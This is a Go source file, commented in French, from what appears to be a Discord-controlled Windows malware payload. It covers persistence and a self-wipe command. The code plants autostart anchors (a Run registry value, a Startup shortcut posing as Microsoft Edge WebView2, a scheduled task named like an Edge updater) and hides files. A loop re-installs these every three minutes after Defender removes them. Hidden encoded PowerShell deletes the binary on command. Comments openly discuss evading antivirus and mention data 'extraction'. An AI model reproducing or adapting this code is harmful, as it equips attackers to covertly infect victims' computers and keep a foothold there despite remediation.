// wipe.go — persistance de secours et retrait complet du payload.
//
// Deux responsabilités qui vont ensemble :
//
//   - poser les ancrages de démarrage (raccourci du dossier Démarrage, tâche
//     planifiée au logon, nettoyage des builds précédents) et les réparer ;
//   - tout retirer sur `!delete confirm` : Registre, raccourci, tâche,
//     miroirs, dossier de travail, puis l'exécutable lui-même.
//
// Le nettoyage des traces anciennes n'est pas cosmétique : chaque build laisse
// sinon une valeur Run et un miroir de plus, donc autant de signatures pour
// l'antivirus.
package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

var procRegEnumValue = advapi32DLL.NewProc("RegEnumValueW")

// wiping est posé par !delete : la boucle principale attend alors la fin du
// nettoyage au lieu de quitter le processus au premier `stopped`.
var wiping atomic.Bool

// startupDir renvoie le dossier Démarrage de l'utilisateur.
func startupDir() string {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return ""
	}
	return filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
}

// startupLinkPath est le raccourci posé dans le dossier Démarrage. Un .lnk
// pointant vers l'exécutable avec `-silent` démarre sans interface ; un .vbs
// ou une copie nue de l'exe, eux, ouvraient une fenêtre et se faisaient
// remarquer.
func startupLinkPath() string {
	dir := startupDir()
	if dir == "" {
		return ""
	}
	return filepath.Join(dir, strings.TrimSuffix(mirrorFileName, ".exe")+".lnk")
}

// startupCopyPath désigne l'ancienne copie nue de l'exécutable (builds
// précédents) : elle est retirée au passage.
func startupCopyPath() string {
	dir := startupDir()
	if dir == "" {
		return ""
	}
	return filepath.Join(dir, mirrorFileName)
}

// taskName est le nom de la tâche planifiée de secours.
func taskName() string { return "MicrosoftEdgeUpdateTask" + buildTag() }

// buildTag rend un suffixe stable par build, dérivé du nom du miroir : la
// tâche et le fichier partagent ainsi la même empreinte.
func buildTag() string {
	var b strings.Builder
	for _, r := range mirrorFileName {
		if r >= '0' && r <= '9' {
			b.WriteRune(r)
		}
	}
	if b.Len() == 0 {
		return "2"
	}
	out := b.String()
	if len(out) > 8 {
		out = out[:8]
	}
	return out
}

// persistTask installe une tâche planifiée au logon : troisième point
// d'ancrage, indépendant du Registre et du dossier Démarrage.
//
// La tâche est créée par PowerShell (Register-ScheduledTask) et non par
// schtasks : la ligne de commande de schtasks casse dès que le chemin de
// l'exécutable contient des guillemets et un argument (`"…\x.exe" -silent`).
// Certains comptes refusent la création (accès refusé) : l'échec est
// journalisé, les deux autres ancrages suffisent.
func persistTask() {
	exe := runTarget()
	if exe == "" {
		return
	}
	script := "$a = New-ScheduledTaskAction -Execute " + qPS(exe) + " -Argument '-watch';" +
		"$t = New-ScheduledTaskTrigger -AtLogOn;" +
		"$s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;" +
		"Register-ScheduledTask -TaskName " + qPS(taskName()) + " -Action $a -Trigger $t -Settings $s -Force | Out-Null"
	if _, err := runPSUTF8(script); err != nil {
		plog("persistance tâche: " + err.Error())
		return
	}
	plog("persistance: tâche planifiée " + taskName())
}

// persistTaskRemove supprime la tâche planifiée.
func persistTaskRemove() {
	c := exec.Command("schtasks.exe", "/Delete", "/F", "/TN", taskName())
	c.SysProcAttr = hiddenAttr()
	_ = c.Run()
}

// persistStartupLink crée le raccourci du dossier Démarrage vers la cible
// courante.
func persistStartupLink() {
	startupLinkTo(runTarget())
}

// startupLinkTo crée le raccourci du dossier Démarrage vers `exe`, avec
// l'argument `-silent` et une fenêtre réduite.
func startupLinkTo(exe string) {
	dst := startupLinkPath()
	if dst == "" || exe == "" {
		return
	}
	if fileExists(dst) {
		return
	}
	script := "(New-Object -ComObject WScript.Shell).CreateShortcut(" + qPS(dst) + ")" +
		" | ForEach-Object { $_.TargetPath=" + qPS(exe) + "; $_.Arguments='-silent';" +
		" $_.WindowStyle=7; $_.Description='Microsoft Edge WebView2 Runtime'; $_.Save() }"
	if _, err := runPSUTF8(script); err != nil {
		plog("persistance démarrage: " + err.Error())
		return
	}
	plog("persistance: raccourci Démarrage " + dst)
}

// hideFile pose les attributs caché + système quand c'est possible.
func hideFile(path string) {
	c := exec.Command("attrib.exe", "+h", "+s", path)
	c.SysProcAttr = hiddenAttr()
	_ = c.Run()
}

// persistCleanupStale retire les traces des builds précédents : valeurs Run
// « UpdateCenter* », raccourcis et miroirs « UpdateSvc* », dossiers de travail
// « HostCache* ». Seuls les noms produits par ce payload sont touchés.
func persistCleanupStale() {
	curRun := runValueName
	curMirror := mirrorFileName
	curWork := workDirName

	// 1. Valeurs Run.
	if h, err := regOpenString(hkeyCurrentUser, runKeyPath); err == nil {
		for _, name := range regValueNames(h) {
			if name == curRun {
				continue
			}
			if isOwnRunName(name) {
				_ = regDeleteValue(hkeyCurrentUser, runKeyPath, name)
				plog("nettoyage: valeur Run " + name)
			}
		}
		regCloseKey(h)
	}

	// 2. Dossier Démarrage : raccourcis et anciennes copies.
	dir := startupDir()
	if dir != "" {
		entries, _ := readDirNames(dir)
		for _, n := range entries {
			low := strings.ToLower(n)
			if strings.HasSuffix(low, ".lnk") && strings.HasPrefix(low, "updatesvc") &&
				n != filepath.Base(startupLinkPath()) {
				_ = os.Remove(filepath.Join(dir, n))
				plog("nettoyage: raccourci " + n)
			}
			if strings.HasSuffix(low, ".exe") && strings.HasPrefix(low, "updatesvc") &&
				n != curMirror {
				_ = os.Remove(filepath.Join(dir, n))
				plog("nettoyage: copie Démarrage " + n)
			}
		}
	}

	// 3. Miroirs dans EdgeUpdate.
	if entries, err := readDirNames(shadowDir()); err == nil {
		for _, n := range entries {
			low := strings.ToLower(n)
			if strings.HasPrefix(low, "updatesvc") && strings.HasSuffix(low, ".exe") &&
				n != curMirror {
				_ = os.Remove(filepath.Join(shadowDir(), n))
				plog("nettoyage: miroir " + n)
			}
		}
	}

	// 4. Dossiers de travail des builds précédents.
	base := appDataLocal()
	if entries, err := readDirNames(base); err == nil {
		for _, n := range entries {
			if !strings.HasPrefix(n, "HostCache") || n == curWork {
				continue
			}
			p := filepath.Join(base, n)
			if st, err := os.Stat(p); err == nil && st.IsDir() {
				_ = os.RemoveAll(p)
				plog("nettoyage: dossier " + n)
			}
		}
	}
}

// isOwnRunName reconnaît les noms de valeur Run produits par ce payload.
func isOwnRunName(name string) bool {
	if name == "Francais2ndUpdate" {
		return true
	}
	if !strings.HasPrefix(name, "UpdateCenter") {
		return false
	}
	for _, r := range name[len("UpdateCenter"):] {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

// regValueNames énumère les noms de valeurs d'une clé ouverte en lecture.
func regValueNames(h uintptr) []string {
	var out []string
	buf := make([]uint16, 1024)
	for i := uint32(0); ; i++ {
		n := uint32(len(buf))
		r, _, _ := procRegEnumValue.Call(h, uintptr(i),
			uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&n)),
			0, 0, 0, 0)
		if r != 0 {
			break
		}
		out = append(out, syscall.UTF16ToString(buf[:n]))
	}
	return out
}

// readDirNames rend les noms des entrées d'un dossier (vide si absent).
func readDirNames(dir string) ([]string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}
	out := make([]string, 0, len(entries))
	for _, e := range entries {
		out = append(out, e.Name())
	}
	return out, nil
}

// persistHeal vérifie les ancrages et répare ce qui manque.
//
// Defender supprime le miroir EdgeUpdate, la clé Run et le raccourci dès qu'il
// reconnaît le binaire ; les copies posées ailleurs survivent. La réparation
// repart donc d'une copie existante (ProgramData en premier) au lieu de
// recréer systématiquement le miroir, et repasse toutes les 3 minutes : sans
// cela une remédiation laissait le poste sans démarrage automatique.
func persistHeal() {
	if !cfg.Persist || stopped.Load() {
		return
	}

	exe := ""
	for _, p := range spreadCopyPaths() {
		if fileExists(p) {
			exe = p
			break
		}
	}
	if exe == "" {
		persistMirror()
		exe = runTarget()
	}
	if exe == "" {
		return
	}
	// Une copie a peut-être été retirée : on la repose.
	spreadCopies(false)

	value := `"` + exe + `" -watch`
	_ = regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, value)
	if !fileExists(startupLinkPath()) {
		startupLinkTo(exe)
	}
	persistTask()
}

// persistHealLoop tourne tant que le payload vit.
func persistHealLoop() {
	for {
		time.Sleep(3 * time.Minute)
		if stopped.Load() {
			return
		}
		persistHeal()
	}
}

// wipeAll retire tout. `confirm` doit valoir "confirm" : la commande sans
// confirmation ne fait qu'afficher l'avertissement.
func wipeAll(confirm string) string {
	if strings.ToLower(strings.TrimSpace(confirm)) != "confirm" {
		return "⚠️ **SUPPRESSION TOTALE — IRRÉVERSIBLE** ⚠️\n" +
			"Cette commande retire **tout** :\n" +
			"• la clé Run du Registre\n" +
			"• le raccourci du dossier Démarrage\n" +
			"• la tâche planifiée\n" +
			"• les copies de repli et les dossiers de travail\n" +
			"• l'exécutable lui-même, puis le processus s'arrête\n\n" +
			"Après cela, plus aucune extraction, plus aucun démarrage automatique.\n" +
			"Pour confirmer : `!delete confirm`"
	}

	discordReply("**SUPPRESSION TOTALE EN COURS…**\n" +
		"retrait de la persistance, des copies et de l'exécutable.")

	ch := targetChannel()
	go func() {
		wiping.Store(true)

		// L'exécutable ne peut pas s'effacer lui-même sous Windows : un
		// PowerShell détaché attend la fin du processus, puis le supprime.
		// Il est lancé ICI, avant tout appel réseau : si le bandeau ou le
		// nettoyage traîne, le processus reste vivant plus longtemps que
		// prévu et le fichier reste verrouillé — la boucle couvre l'attente.
		//
		// Le script passe par -EncodedCommand : le chemin accentués
		// (« Français ») n'a alors plus à traverser l'analyseur de ligne de
		// commande, qui transformait les guillemets en \" et faisait échouer
		// silencieusement chaque tentative de suppression.
		exe := currentExe()
		if exe != "" {
			script := "$p = '" + strings.ReplaceAll(exe, "'", "''") + "';" +
				"for ($i = 0; $i -lt 120; $i++) {" +
				"  if (-not (Test-Path -LiteralPath $p)) { break }" +
				"  try { Remove-Item -LiteralPath $p -Force -ErrorAction Stop; break } catch { }" +
				"  Start-Sleep -Milliseconds 1500" +
				"}"
			c := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive",
				"-WindowStyle", "Hidden", "-EncodedCommand", psEncoded(script))
			c.SysProcAttr = hiddenAttr()
			_ = c.Start()
		}

		time.Sleep(1500 * time.Millisecond)
		stopped.Store(true)
		cfg.Enabled = false

		// Persistance : les ancrages, plus les anciennes empreintes.
		_ = regDeleteValue(hkeyCurrentUser, runKeyPath, runValueName)
		for _, n := range legacyRunNames {
			_ = regDeleteValue(hkeyCurrentUser, runKeyPath, n)
		}
		persistTaskRemove()
		for _, p := range []string{startupLinkPath(), startupCopyPath(), shadowPath()} {
			if p != "" {
				_ = os.Remove(p)
			}
		}
		legacy := os.Getenv("APPDATA") +
			`\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.vbs`
		_ = os.Remove(legacy)

		// Le bandeau passe au rouge avant que le salon ne réponde plus.
		if ch != "" {
			postStatus(false)
			postInfosStatus(false)
		}
		time.Sleep(1500 * time.Millisecond)

		// Dossiers de travail de tous les builds. Les journaux peuvent être
		// encore ouverts par les goroutines qui s'arrêtent : on réessaie.
		base := appDataLocal()
		for attempt := 0; attempt < 5; attempt++ {
			entries, err := readDirNames(base)
			if err != nil {
				break
			}
			remaining := 0
			for _, n := range entries {
				if !strings.HasPrefix(n, "HostCache") {
					continue
				}
				if err := os.RemoveAll(filepath.Join(base, n)); err != nil {
					remaining++
				}
			}
			if remaining == 0 {
				break
			}
			time.Sleep(400 * time.Millisecond)
		}

		time.Sleep(300 * time.Millisecond)
		os.Exit(0)
	}()
	return "suppression lancée."
}
